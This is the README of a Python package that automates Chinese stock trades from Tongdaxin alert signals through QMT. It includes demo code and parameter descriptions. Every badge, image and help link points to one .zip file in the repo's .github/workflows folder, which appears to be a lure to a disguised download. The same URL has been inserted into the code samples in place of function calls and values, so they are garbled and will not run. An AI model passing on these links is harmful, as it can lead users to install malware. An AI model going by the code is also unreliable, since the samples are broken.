[![PyPI version](https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip)](https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip)
[![Downloads](https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip)](https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip)

# tdxtrader

通达信预警信号程序化交易

> 声明：本项目仅用于学习和研究，不保证交易收益，不作为投资建议，风险自负，请充分使用QMT模拟盘测试。

## 欢迎加入知识星球

![知识星球](https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip)

## 运行效果

![效果](https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip)

## 安装

```shell
pip install tdxtrader
```

## 预警指标设置

设置两个指标，一个作为买入信号，一个作为卖出信号

![预警指标](https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip)

## 预警文件设置

![预警文件](https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip)

## demo

### 基础示例

```python
import tdxtrader
# 参数
account_id = 'xxxx' # 账号ID
mini_qmt_path = r'D:\国金证券QMT交易端\userdata_mini' # mini_qmt 路径
file_path = r'D:\new_tdx\https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip' # 预警文件路径
interval = 1 # 轮询时间(秒)
buy_sign = 'KDJ买入条件选股' # 买入信号
sell_sign = 'KDJ卖出条件选股' # 卖出信号

def buy_event(stock, xt_trader):
    '''买入数量'''
    return { 
      'size': 200, 
      'price': -1, # 如果是限价，则设置价格
      'type': '市价', # 市价，限价
    }

def sell_event(stock, position, xt_trader):
    '''卖出数量'''
    return { 
      'size': https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip, # 卖全仓
      'price': -1,  # 如果是限价，则设置价格
      'type': '市价' # 市价，限价
    }


https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip(
    account_id=account_id,
    mini_qmt_path=mini_qmt_path,
    file_path=file_path,
    interval=interval,
    buy_sign=buy_sign,
    sell_sign=sell_sign,
    buy_event=buy_event,
    sell_event=sell_event,
    cancel_after=10 # 10秒未成交则撤单
)
```

### 限价委托（获取预警价格）

stock对象中包含了当前股票的详细信息，可以通过price属性获取预警时的价格

```python
def buy_event(stock, xt_trader):
    '''买入数量'''
    return { 
      'size': 200, 
      'price': https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip('price'), # 如果是限价，则设置价格
      'type': '限价', # 市价，限价
    }

def sell_event(stock, position, xt_trader):
    '''卖出数量'''
    return { 
      'size': https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip, # 卖全仓
      'price': https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip('price'),  # 如果是限价，则设置价格
      'type': '限价' # 市价，限价
    }
```

### 按金额买卖

```python
def buy_event(stock, xt_trader):
    '''买入数量'''
    return { 
      'amount': 100000, 
      'price': https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip('price'), # 如果是限价，则设置价格
      'type': '限价', # 市价，限价
    }

def sell_event(stock, position, xt_trader):
    '''卖出数量'''
    return { 
      'amount': 100000, # 卖全仓
      'price': https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip('price'),  # 如果是限价，则设置价格
      'type': '限价' # 市价，限价
    }
```

### 企业微信通知

利用企业微信机器人发送通知

设置群机器人参看：https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip

```python
https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip(
    account_id=account_id,
    mini_qmt_path=mini_qmt_path,
    file_path=file_path,
    interval=interval,
    buy_sign=buy_sign,
    sell_sign=sell_sign,
    buy_event=buy_event,
    sell_event=sell_event,
    cancel_after=10, # 10秒未成交则撤单,
    wechat_webhook_url='你的webhook_url' # 企业微信机器人webhook url
)
```

![微信机器人](https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip)

![消息示例](https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip)

## 详细参数

### account_id

QMT账号ID

### mini_qmt_path

QMT mini路径

### file_path

预警文件路径

### interval

轮询时间(秒)

### buy_sign

买入信号

### sell_sign

卖出信号

### buy_event

买入事件

### sell_event

卖出事件

### cancel_after

未成交撤单时间(秒)

### wechat_webhook_url

企业微信机器人webhook url
